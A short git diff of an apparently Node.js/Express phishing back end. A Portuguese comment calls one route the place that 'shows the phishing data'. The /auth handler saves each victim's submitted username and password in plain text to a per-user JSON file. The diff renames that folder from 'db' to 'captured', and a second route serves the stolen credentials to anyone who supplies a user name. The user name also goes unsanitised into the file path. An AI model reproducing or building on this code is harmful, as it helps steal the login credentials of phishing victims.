@@ -68,7 +68,7 @@ app.post('/auth', function(request, response) {
 	var user = request.body.user
 	var pwd = request.body.pwd
 
-    fs.writeFile(`db/${user}.user.json`, `
+    fs.writeFile(`captured/${user}.user.json`, `
 {
         "username":"${user}",
         "pass":"${pwd}"
@@ -109,7 +109,7 @@ app.post('/auth', function(request, response) {
 
 // rota que mostra os dados do pishing
 app.get('/vw/:user', (req, res)=> {
-    res.sendFile(path.join(__dirname + `/db/${req.params.user}.user.json`))
+    res.sendFile(path.join(__dirname + `/captured/${req.params.user}.user.json`))
 })
 
 
